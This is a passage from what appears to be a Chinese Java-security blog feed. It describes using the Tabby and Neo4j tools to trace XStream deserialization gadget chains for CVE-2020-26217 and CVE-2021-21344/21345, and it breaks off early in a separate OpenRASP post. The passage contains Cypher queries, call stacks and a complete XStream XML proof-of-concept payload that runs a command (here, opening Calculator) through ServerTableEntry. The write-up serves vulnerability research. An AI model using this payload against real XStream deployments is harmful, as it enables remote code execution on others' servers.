title="CVE-2020-26217"></a>CVE-2020-26217</h3><h4 id="核心调用链1-1"><a href="#核心调用链1-1" class="headerlink" title="核心调用链1"></a>核心调用链1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;filter&quot; and m1.CLASSNAME&#x3D;&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-173.png" alt="upload successful"></p><h4 id="转接点"><a href="#转接点" class="headerlink" title="转接点"></a>转接点</h4><p>可以看到，只标注了部分的链，原因为javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator#nextElement-&gt;java.util.Enumeration#nextElement-&gt; javax.naming.NameImpl#equals 无法走通。这种情况在后续的case种也会经常遇到，因为Java有多态特性，而ALIAS是纯静态分析。</p><p>上述链没办法打通Trigger，这个时候需要手动分析，发现java.io.SequenceInputStream#nextStream可以调用e.nextElement且e可控。如此，接着分析nextStream到Trigger的可行性。</p><h4 id="核心调用链2-1"><a href="#核心调用链2-1" class="headerlink" title="核心调用链2"></a>核心调用链2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;nextStream&quot; and m1.CLASSNAME&#x3D;&quot;java.io.SequenceInputStream&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,8) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-174.png" alt="upload successful"></p><h4 id="调用栈-3"><a href="#调用栈-3" class="headerlink" title="调用栈"></a>调用栈</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect) [2]</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">filter:613, ImageIO$ContainsFilter (javax.imageio)</span><br><span class="line">advance:834, FilterIterator (javax.imageio.spi)</span><br><span class="line">next:852, FilterIterator (javax.imageio.spi)</span><br><span class="line">nextElement:153, MultiUIDefaults$MultiUIDefaultsEnumerator (javax.swing)</span><br><span class="line">nextStream:110, SequenceInputStream (java.io)</span><br><span class="line">read:211, SequenceInputStream (java.io)</span><br><span class="line">readFrom:65, ByteArrayOutputStreamEx (com.sun.xml.internal.bind.v2.util)</span><br><span class="line">get:182, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">toString:286, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">getStringValue:121, NativeString (jdk.nashorn.internal.objects)</span><br><span class="line">hashCode:117, NativeString (jdk.nashorn.internal.objects)</span><br><span class="line">hash:339, HashMap (java.util)</span><br><span class="line">put:612, HashMap (java.util)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21344-21345"><a href="#CVE-2021-21344-21345" class="headerlink" title="CVE-2021-21344/21345"></a>CVE-2021-21344/21345</h3><p>21344/21345的这个Gadgets核心在DataTransferer$IndexedComparator到GetterSetterReflection的流程，流程比较复杂</p><h4 id="调用栈-4"><a href="#调用栈-4" class="headerlink" title="调用栈"></a>调用栈</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">verify:173, ServerTableEntry (com.sun.corba.se.impl.activation)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">get:343, Accessor$GetterSetterReflection (com.sun.xml.internal.bind.v2.runtime.reflect)</span><br><span class="line">serializeURIs:402, ClassBeanInfoImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">childAsXsiType:662, XMLSerializer (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">write:256, MarshallerImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:89, BridgeImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:130, Bridge (com.sun.xml.internal.bind.api)</span><br><span class="line">marshal:161, BridgeWrapper (com.sun.xml.internal.ws.db.glassfish)</span><br><span class="line">writeTo:109, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">asInputStream:99, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getInputStream:125, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getMessage:366, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:465, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:103, MessageWrapper (com.sun.xml.internal.ws.api.message)</span><br><span class="line">get:111, ResponseContext (com.sun.xml.internal.ws.client)</span><br><span class="line">compareIndices:2492, DataTransferer$IndexedComparator (sun.awt.datatransfer)</span><br><span class="line">compare:2971, DataTransferer$IndexOrderComparator (sun.awt.datatransfer)</span><br><span class="line">siftDownUsingComparator:722, PriorityQueue (java.util)</span><br><span class="line">siftDown:688, PriorityQueue (java.util)</span><br><span class="line">heapify:737, PriorityQueue (java.util)</span><br><span class="line">readObject:797, PriorityQueue (java.util)</span><br></pre></td></tr></table></figure><h4 id="寻找核心中间链1"><a href="#寻找核心中间链1" class="headerlink" title="寻找核心中间链1"></a>寻找核心中间链1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream Runtime.exec</span><br><span class="line">match path&#x3D;(m1:Method&#123;NAME:&quot;exec&quot;,CLASSNAME:&quot;java.lang.Runtime&quot;&#125;)&lt;-[r:CALL]-(m2:Method) </span><br><span class="line">return path</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-162.png" alt="upload successful"><br>如图，com.sun.corba.se.impl.activation.ServerTableEntry#verify</p><p>尝试寻找Trigger</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;verify&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.corba.se.impl.activation.ServerTableEntry&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,13) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p>但是无果，无法直接串联</p><h4 id="寻找核心中间链2"><a href="#寻找核心中间链2" class="headerlink" title="寻找核心中间链2"></a>寻找核心中间链2</h4><p>有一种核心中间链，proxy类，存在invoke，且method、obj可控的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; invoke</span><br><span class="line">match path&#x3D;(sink:Method &#123;IS_SINK:true, NAME:&quot;invoke&quot;&#125;)&lt;-[:CALL]-(m1:Method) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br><span class="line">order by m1.CLASSNAME</span><br></pre></td></tr></table></figure><p>都过一遍，可以得出类似以下可控的类</p><p><img src="/images/pasted-163.png" alt="upload successful"></p><h4 id="寻找核心中间链3"><a href="#寻找核心中间链3" class="headerlink" title="寻找核心中间链3"></a>寻找核心中间链3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;get&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,16) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-166.png" alt="upload successful"></p><h4 id="寻找核心中间链4"><a href="#寻找核心中间链4" class="headerlink" title="寻找核心中间链4"></a>寻找核心中间链4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;marshal&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,12) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-167.png" alt="upload successful"></p><h4 id="寻找核心中间链4-1"><a href="#寻找核心中间链4-1" class="headerlink" title="寻找核心中间链4"></a>寻找核心中间链4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;getInputStream&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.ws.message.JAXBAttachment&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,12) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-168.png" alt="upload successful"></p><h4 id="寻找核心中间链5"><a href="#寻找核心中间链5" class="headerlink" title="寻找核心中间链5"></a>寻找核心中间链5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;get&quot;] </span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;getInputStream&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.ws.message.JAXBAttachment&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,5) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-169.png" alt="upload successful"></p><h4 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h4><p>原理及分析可以看上一篇</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>verify<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">activationCmd</span>&gt;</span>open /Applications/Calculator.app<span class="tag">&lt;/<span class="name">activationCmd</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文从Gadget挖掘角度，使用tabby复现了几个Gadget的挖掘过程，ssrf的2个链很简单，rce有些个比较复杂，最短路径算法不能直接串起。这些个链的重点在于中间核心链路的组装，本菜🐔也只能倒推出部分节点，还有一些关键转折点如果在不知情的情况下自己来，大概率是发现不了的。</p><p>其他思考&amp;总结</p><ol><li>apoc.algo.allSimplePaths 是最短路径，有最短就不会列出其他的，而最短的不一定是有效的，导致可能会漏（也可以搭配[r:CALL|ALIAS*5..8]使用）。</li><li>中间核心链路的组装，因为invoke等不能自动串起，需要积累。</li><li>21342、21345 可以看出还有其他的路径，是否也可行？（等有精力再验证下吧😓）</li></ol><p>最后再次感谢wh1t3p1g师傅，用tabby混了个cve，也逆向复现了这些Gadgets的挖掘思路。</p><p>1.4.17新出那些其他的Gadgets，还没空分析如何找到链的，等有精力再水一节吧。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://github.com/wh1t3p1g/tabby/wiki/%E7%8E%B0%E6%9C%89%E5%88%A9%E7%94%A8%E9%93%BE%E8%A6%86%E7%9B%96">tabby-现有利用链覆盖</a></li><li>[2] <a href="https://blog.0kami.cn/2021/03/14/java-how-to-find-gadget-chains/">如何高效的挖掘Java反序列化利用链？</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;月底在即，再不写点东西，每月一篇都要食言了。上个月刚挖的OpenRASP的坑，本打算再研究研究绕过姿势，验证下猜想，也没下文。正好6月份交的XStream SSRF Gadget CVE下来，之前XStream系列草稿箱里也待着之前逆向分析师傅们挖掘的思路&amp;amp;手法，正好编辑编辑，水一篇”如何挖掘XStream Gadgets”。&lt;/p&gt;
&lt;p&gt;首先感谢Wh1t3p1g师傅的Tabby，用起来比gadgetinspector更顺手，找链神器。&lt;/p&gt;
&lt;h2 id=&quot;Tabby&quot;&gt;&lt;a href=&quot;#Tabby&quot; class=&quot;headerlink&quot; title=&quot;Tabby&quot;&gt;&lt;/a&gt;Tabby&lt;/h2&gt;&lt;p&gt;有关Tabby的介绍，详情可以参考【1】中Wh1t3p1g师傅的几个wiki，写的很详细了，这里也不多啰嗦。（这里膜一下Wh1t3p1g师傅）&lt;/p&gt;
&lt;p&gt;Neo4j 查询比较吃cpu，小本本加上idea同时跑吃力，搞台vps跑比较好，但是tabby是通过apoc.load.csv file写Neo4j数据的，相当于限制了本机，因此给下整库的dump和load（当然，直接整个在vps上操作也是ok的）。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# dump neo4j database&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;neo4j-admin dump --to /tmp/neo4j.dump --database neo4j&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# scp dump file to vps&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# load neo4j dump file&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/neo4j stop&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/neo4j-admin load --from=/root/neo4j.dump --database=neo4j --force&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/neo4j start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Gadget" scheme="http://m0d9.me/tags/Gadget/"/>
    
    <category term="Tabby" scheme="http://m0d9.me/tags/Tabby/"/>
    
    <category term="XStream" scheme="http://m0d9.me/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>OpenRASP学习笔记（一）</title>
    <link href="http://m0d9.me/2021/07/13/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://m0d9.me/2021/07/13/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-07-13T10:23:00.000Z</published>
    <updated>2021-07-18T13:34:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>RASP（Runtime Application self-protection）技术自Gartner在2014年提出，已经有挺长一段时间了。大厂们现在基本也都有自研的RASP、IAST产品。在开源RASP中，应以OpenRASP起步最早，应用也最广。不过因为性能原因，在实际攻防中覆盖面还是有限。</p><p>RASP算是Java安全绕不开的一个技术点，有兴趣对此学习研究一番。参考文章中threedr3am、tr1ple、c0d3p1ut0s几个师傅们对于OpenRASP的原理、技术点都有跟踪和解释，因此本文不再多做类似的阐释，主要针对自己的一些知识盲点、兴趣点，做做研究与笔记。</p><h2 id="OpenRASP的Hook"><a href="#OpenRASP的Hook" class="headerlink" title="OpenRASP的Hook"></a>OpenRASP的Hook</h2><p>关注两点：</p><ol><li>如何Hook的</li><li>Hook了哪些类的哪些方法</li></ol><h3 id="如何Hook"><a href="#如何Hook" class="headerlink" title="如何Hook"></a>如何Hook</h3><a id="more"></a><p>官方文档已经描述的很详细了<br><img src="/images/pasted-147.png" alt="upload successful"></p><p>注意步骤2 Retransfrom，第一次遇到</p><h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p>Java Instrumentation APi支持启动时/运行时Attach Agent，具体看个简单例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMainTest</span> </span>&#123;</span><br><span class="line"><span class="comment">//    public static void agentmain(String agentArgs, Instrumentation instrumentation) &#123;</span></span><br><span class="line"><span class="comment">//        instrumentation.addTransformer(new DefineTransformer(), true);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span 